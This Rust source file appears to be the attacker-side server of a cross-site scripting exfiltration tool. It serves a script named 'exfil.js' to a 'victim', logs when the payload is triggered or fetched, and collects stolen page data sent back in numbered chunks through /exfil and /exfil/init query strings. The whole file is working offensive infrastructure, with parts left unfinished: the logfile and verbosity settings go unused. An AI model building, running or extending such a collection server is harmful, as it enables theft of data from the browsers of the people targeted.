use hyper::service::{make_service_fn, service_fn};
use hyper::{Body, Method, Request, Response, Server, StatusCode};
use tokio::fs::File;
use tokio_util::codec::{BytesCodec, FramedRead};
use termion::color;
use url::form_urlencoded;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};

//use crate::convert;

struct Counter{
    payload: String,
    count: u32,
}

/// This is our service handler. It receives a Request, routes on its
/// path, and returns a Future of a Response.
pub async fn exfil(req: Request<Body>, _logfile: String, _verbosity: bool, mutex: Arc<Mutex<Counter>> ) -> Result<Response<Body>, hyper::Error> {
    match (req.method(), req.uri().path()) {
        // Serve some instructions at /
        (&Method::GET, "/") | (&Method::GET, "/index.html") =>{
            println!("[+] Payload Triggered!");
            Ok(Response::new(Body::from("OK")))
        },

        // Fetch Javascript File
        (&Method::GET, "/exfil.js") => {
            if let Ok(file) = File::open("exfil.js").await {
                println!("{}[!] Payload Fetched By Victim!{}", color::Fg(color::Magenta), color::Fg(color::Reset));
                let stream = FramedRead::new(file, BytesCodec::new());
                let body = Body::wrap_stream(stream);
                return Ok(Response::new(body));
            }
            println!("[!] Could Not Find File!");
            Ok(Response::new(Body::from("NOT FOUND")))
        },

        // Exfil HTML Data
        (&Method::GET, "/exfil") => {
            let query = if let Some(q) = req.uri().query() {
                q
            } else {
                return Ok(Response::new(Body::from("Ok")));
            };
            let params = form_urlencoded::parse(query.as_bytes())
                .into_owned()
                .collect::<HashMap<String, String>>();
            let chunk = if let Some(p) = params.get("chunk") {
                p
            } else {
                return Ok(Response::new(Body::from("Not Ok")));
            };
            let num = if let Some(p) = params.get("num") {
                p
            } else {
                return Ok(Response::new(Body::from("Not Ok")));
            };
            
            let num: u32 = num.as_str().trim().parse().unwrap();
            
            println!("[+] Received {} chunks as : {}",num+1, chunk);
            Ok(Response::new(Body::from("Ok")))
        },

        (&Method::GET, "/exfil/init") => {
            let query = if let Some(q) = req.uri().query() {
                q
            } else {
                return Ok(Response::new(Body::from("Ok")));
            };
            let params = form_urlencoded::parse(query.as_bytes())
                .into_owned()
                .collect::<HashMap<String, String>>();
            
            let number_of_chunks = if let Some(p) = params.get("noc") {
                p
            } else {
                return Ok(Response::new(Body::from("Not Ok")));
            };

            let number_of_chunks: u32 = number_of_chunks.as_str().trim().parse().unwrap();
            {
                let mut x = mutex.lock().unwrap();
                x.count = number_of_chunks ;
            }
            println!("{}[+] Fetching Data In A Total Of {} chunks{}",color::Fg(color::LightGreen), number_of_chunks+1,color::Fg(color::Reset));
            Ok(Response::new(Body::from("Ok")))
        },


        // Return the 404 Not Found for other routes.
        _ => {
            let mut not_found = Response::default();
            *not_found.status_mut() = StatusCode::NOT_FOUND;
            Ok(not_found)
        }
    }
}

#[tokio::main]
pub async fn start_listener(port: u16, logfile: String, verbosity: bool) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    
    println!("{}[+] Logfile: {}",color::Fg(color::Yellow), logfile);
    println!("{}[+] Verbosity: {}",color::Fg(color::LightRed), verbosity);
    
    let addr = ([0, 0, 0, 0], port).into();

    let payload = "".to_string();
    let count: u32 = 0;
//    let mut get_counter = Counter{ payload, count };

    let mut primary_mutex :  Arc<Mutex<Counter>> = Arc::new(Mutex::new(Counter{ payload, count }));


    //let service = make_service_fn(|_| async { Ok::<_, hyper::Error>(service_fn(exfil)) });
    let service = make_service_fn(move |_| {
        let logfile = logfile.clone();
        let mut primary_mutex = primary_mutex.clone();
        async move {
            Ok::<_, hyper::Error>(service_fn(move |req| {
                exfil(req, logfile.clone(), verbosity, primary_mutex )
            }))
        }
    });

    let server = Server::bind(&addr).serve(service);

    println!("{}[!] Listening on http://{}{}",color::Fg(color::LightBlue), addr,color::Fg(color::Reset));

    server.await?;

    Ok(())
}
